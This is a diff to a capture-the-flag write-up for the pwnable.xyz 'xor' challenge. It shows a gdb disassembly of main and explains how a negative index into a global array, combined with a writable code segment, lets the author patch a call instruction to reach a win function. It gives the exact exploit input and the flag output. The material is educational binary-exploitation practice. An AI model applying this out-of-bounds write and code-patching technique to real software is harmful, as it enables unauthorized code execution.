@@ -455,28 +455,105 @@ $
 ```
 
 ## 7. xor
-```c
-int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
-{
-  int v3; // [rsp+Ch] [rbp-24h]
-  __int64 v4; // [rsp+10h] [rbp-20h]
-  __int64 v5; // [rsp+18h] [rbp-18h]
-  __int64 v6; // [rsp+20h] [rbp-10h]
-  unsigned __int64 v7; // [rsp+28h] [rbp-8h]
+```nasm
+Dump of assembler code for function main:
+   0x0000000008000a34 <+0>:     push   rbp
+   0x0000000008000a35 <+1>:     mov    rbp,rsp
+   0x0000000008000a38 <+4>:     sub    rsp,0x30
+   0x0000000008000a3c <+8>:     mov    rax,QWORD PTR fs:0x28
+   0x0000000008000a45 <+17>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000008000a49 <+21>:    xor    eax,eax
+   0x0000000008000a4b <+23>:    lea    rdi,[rip+0x15b]        # 0x8000bad "The Poopolator"
+   0x0000000008000a52 <+30>:    call   0x80007f0 <puts@plt>
+   0x0000000008000a57 <+35>:    call   0x80009c9 <setup>
+   0x0000000008000a5c <+40>:    mov    QWORD PTR [rbp-0x10],0x0
+   0x0000000008000a64 <+48>:    lea    rdi,[rip+0x151]        # 0x8000bbc "> 💩   "
+   0x0000000008000a6b <+55>:    mov    eax,0x0
+   0x0000000008000a70 <+60>:    call   0x8000800 <printf@plt>
+   0x0000000008000a75 <+65>:    lea    rcx,[rbp-0x10]
+   0x0000000008000a79 <+69>:    lea    rdx,[rbp-0x18]
+   0x0000000008000a7d <+73>:    lea    rax,[rbp-0x20]
+   0x0000000008000a81 <+77>:    mov    rsi,rax
+   0x0000000008000a84 <+80>:    lea    rdi,[rip+0x13b]        # 0x8000bc6 "%ld %ld %ld"
+   0x0000000008000a8b <+87>:    mov    eax,0x0
+   0x0000000008000a90 <+92>:    call   0x8000828 <scanf>
+   0x0000000008000a95 <+97>:    mov    DWORD PTR [rbp-0x24],eax
+   0x0000000008000a98 <+100>:   mov    rax,QWORD PTR [rbp-0x20]   ; a exists
+   0x0000000008000a9c <+104>:   test   rax,rax
+   0x0000000008000a9f <+107>:   je     0x8000ac3 <main+143>
+   0x0000000008000aa1 <+109>:   mov    rax,QWORD PTR [rbp-0x18]   ; b exists
+   0x0000000008000aa5 <+113>:   test   rax,rax
+   0x0000000008000aa8 <+116>:   je     0x8000ac3 <main+143>
+   0x0000000008000aaa <+118>:   mov    rax,QWORD PTR [rbp-0x10]   ; c exists
+   0x0000000008000aae <+122>:   test   rax,rax
+   0x0000000008000ab1 <+125>:   je     0x8000ac3 <main+143>
+   0x0000000008000ab3 <+127>:   mov    rax,QWORD PTR [rbp-0x10]   ; c<=9
+   0x0000000008000ab7 <+131>:   cmp    rax,0x9
+   0x0000000008000abb <+135>:   jg     0x8000ac3 <main+143>
+   0x0000000008000abd <+137>:   cmp    DWORD PTR [rbp-0x24],0x3 ; input count == 3
+   0x0000000008000ac1 <+141>:   je     0x8000acd <main+153>
+   0x0000000008000ac3 <+143>:   mov    edi,0x1
+   0x0000000008000ac8 <+148>:   call   0x8000830 <exit@plt>
+   0x0000000008000acd <+153>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000008000ad1 <+157>:   mov    rcx,QWORD PTR [rbp-0x20]
+   0x0000000008000ad5 <+161>:   mov    rdx,QWORD PTR [rbp-0x18]
+   0x0000000008000ad9 <+165>:   xor    rcx,rdx          ; a^b
+   0x0000000008000adc <+168>:   lea    rdx,[rax*8+0x0]  ; c*8
+   0x0000000008000ae4 <+176>:   lea    rax,[rip+0x201715]        # 0x8202200 <result>
+   0x0000000008000aeb <+183>:   mov    QWORD PTR [rdx+rax*1],rcx  ; <result>+c*8 = a^b
+   0x0000000008000aef <+187>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000008000af3 <+191>:   lea    rdx,[rax*8+0x0]
+   0x0000000008000afb <+199>:   lea    rax,[rip+0x2016fe]        # 0x8202200 <result>
+   0x0000000008000b02 <+206>:   mov    rax,QWORD PTR [rdx+rax*1]
+   0x0000000008000b06 <+210>:   mov    rsi,rax
+   0x0000000008000b09 <+213>:   lea    rdi,[rip+0xc2]        # 0x8000bd2 "Result: %ld\n"
+   0x0000000008000b10 <+220>:   mov    eax,0x0
+   0x0000000008000b15 <+225>:   call   0x8000800 <printf@plt>
+   0x0000000008000b1a <+230>:   jmp    0x8000a5c <main+40>
+End of assembler dump.
+```
+The main function has a loop that gets 3 long inputs : a, b, c. All 3 input must be valid and c has to be smaller or equal to 9, otherwise the program terminates.
 
-  v7 = __readfsqword(0x28u);
-  puts("The Poopolator");
-  setup("The Poopolator", argv);
-  while ( 1 )
-  {
-    v6 = 0LL;
-    printf(format);
-    v3 = _isoc99_scanf("%ld %ld %ld", &v4, &v5, &v6);
-    if ( !v4 || !v5 || !v6 || v6 > 9 || v3 != 3 )
-      break;
-    result[v6] = v5 ^ v4;
-    printf("Result: %ld\n", result[v6]);
-  }
-  exit(1);
-}
+After validation, XOR of a and b is saved to [result + c*8].
+
+```bash
+gdb-peda$ cat /proc/187/maps
+08000000-08001000 rwxp 00000000 00:00 976125                     ~/challenge
+08201000-08202000 r--p 00001000 00:00 976125                     ~/challenge
+08202000-08203000 rw-p 00002000 00:00 976125                     ~/challenge
+```
+We have write permission to code segment.
+
+And since the address of ``main`` is smaller than ``<result>``, we could overwrite a call instruction with ``<win>``'s address and get the flag.
+
+the call instruction looks something like this when disassembled:
+```
+E8 X1 X2 X3 X4  ;X4 X3 X2 X1 : offset = [target address] - [current eip(rip)] - 5
+```
+I'm going to overwrite the call instruction at <main+225>, so eip would be 0x8000b15. With the target address of 0x8000a21, offset would be [0x8000a21 - 0x8000b15 - 5] = 0xffffff07.
+
+Also, we have to consider the fact that our target address should be in the form of [<result> - 8*i]. Forcing us to use 0x8000b10 (= <result> - (262878*8))
+
+We have to change this
+```
+0x8000b10 E8 E6 FC FF FF
+0x8000b10 <main+220>:   0xfce6e800000000b8
+```
+to this
+```
+0x8000b10 E8 07 FF FF FF
+0x8000b10 <main+220>:   0xff07e800000000b8
+```
+
+exploit:
+```bash
+junheah@ubuntu:~$ nc svc.pwnable.xyz 30029
+The Poopolator
+> 💩   -69832182503309127 1 -262878
+FLAG{how_did_text_happen_to_be_rwx}> 💩
+```
+
+```
+reference:
+https://umbum.tistory.com/102
 ```
